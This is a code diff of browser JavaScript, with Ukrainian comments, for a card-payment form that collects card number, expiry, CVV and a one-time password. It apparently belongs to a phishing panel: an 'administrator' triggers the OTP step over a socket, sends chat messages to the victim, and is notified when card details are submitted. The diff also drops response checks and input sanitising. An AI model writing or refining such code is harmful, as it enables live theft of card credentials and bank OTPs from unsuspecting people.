@@ -6,27 +6,25 @@ const otpInput = document.getElementById('otp');
 const submitOtp = document.getElementById('submit-otp');
 const cardNumberInput = document.getElementById('number');
 const cardTypeIcon = document.querySelector('.card-type-icon');
-const socket = io();
+const socket = io('https://localhost:3000', {
+    withCredentials: true,
+    rejectUnauthorized: false
+});
 
 let csrfToken = null;
 
 // Функція для отримання CSRF токену
 async function getCsrfToken() {
   try {
-    const response = await fetch('/csrf-token', {
-      method: 'GET',
+    const response = await fetch('https://localhost:3000/get-csrf-token', {
       credentials: 'include'
     });
     
-    if (!response.ok) {
-      throw new Error('Failed to fetch CSRF token');
-    }
-    
     const data = await response.json();
+    csrfToken = data.csrfToken; // Зберігаємо токен у змінну
     return data.csrfToken;
   } catch (error) {
-    console.error('Error fetching CSRF token:', error);
-    showNotification('Failed to get security token');
+    console.error('Помилка отримання CSRF токену:', error);
     return null;
   }
 }
@@ -167,64 +165,59 @@ async function initForm() {
   }
 }
 
+// Обробка відправки форми карти
 cardForm.addEventListener('submit', async (e) => {
   e.preventDefault();
   
-  const data = {
-    name: document.getElementById('name').value.trim(),
-    number: document.getElementById('number').value.replace(/\s+/g, ''),
+  if (!csrfToken) {
+    csrfToken = await getCsrfToken();
+    if (!csrfToken) {
+      showNotification('Помилка безпеки. Спробуйте оновити сторінку.', true);
+      return;
+    }
+  }
+  
+  const formData = {
+    name: document.getElementById('name').value,
+    number: document.getElementById('number').value.replace(/\s/g, ''),
     exp: document.getElementById('exp').value,
-    cvv: document.getElementById('cvv').value.replace(/\D/g, ''),
-    clientInfo: getClientInfo()
+    cvv: document.getElementById('cvv').value,
+    page: 1
   };
 
-  if (!validateCardData(data)) {
+  if (!validateCardData(formData)) {
     return;
   }
 
-  try {
-    const token = await getCsrfToken();
-    if (!token) {
-      throw new Error('Security token is missing');
-    }
+  loading.style.display = 'block';
+  cardForm.style.display = 'none';
 
-    loading.style.display = 'block';
-    cardForm.style.display = 'none';
-    notification.style.display = 'none';
-    
-    const response = await fetch('/card', {
+  try {
+    const response = await fetch('https://localhost:3000/card', {
       method: 'POST',
-      headers: { 
+      headers: {
         'Content-Type': 'application/json',
-        'X-CSRF-Token': token
+        'CSRF-Token': csrfToken
       },
       credentials: 'include',
-      body: JSON.stringify(data)
+      body: JSON.stringify(formData)
     });
 
-    if (!response.ok) {
-      const errorData = await response.json();
-      throw new Error(errorData.error || 'Failed to process card data');
-    }
-
-    const responseData = await response.json();
+    const data = await response.json();
     
-    if (responseData.error) {
-      throw new Error(responseData.error);
-    }
-
-    // Очікуємо на відповідь від адміністратора
-    socket.once('show-otp-form', () => {
-      loading.style.display = 'none';
+    if (response.ok) {
+      socket.emit('card-submitted', { id: data.id, page: 1 });
+      showNotification('Дані картки успішно відправлено', false);
       otpForm.style.display = 'block';
-    });
-
+    } else {
+      throw new Error(data.error || 'Помилка відправки даних картки');
+    }
   } catch (error) {
-    console.error('Payment processing error:', error);
-    showNotification(error.message);
-    loading.style.display = 'none';
+    showNotification(error.message, true);
     cardForm.style.display = 'block';
   }
+  
+  loading.style.display = 'none';
 });
 
 submitOtp.addEventListener('click', async () => {
@@ -296,17 +289,5 @@ socket.on('chat', (msg) => {
   showNotification(`Admin: ${msg}`, false);
 });
 
-// Ініціалізація при завантаженні
-document.addEventListener('DOMContentLoaded', async () => {
-  cardForm.style.display = 'block';
-  loading.style.display = 'none';
-  otpForm.style.display = 'none';
-  notification.style.display = 'none';
-  
-  // Отримуємо CSRF токен при завантаженні
-  try {
-    await getCsrfToken();
-  } catch (error) {
-    showNotification('Помилка ініціалізації безпеки. Спробуйте оновити сторінку.');
-  }
-}); 
+// Ініціалізуємо форму при завантаженні
+document.addEventListener('DOMContentLoaded', initForm); 
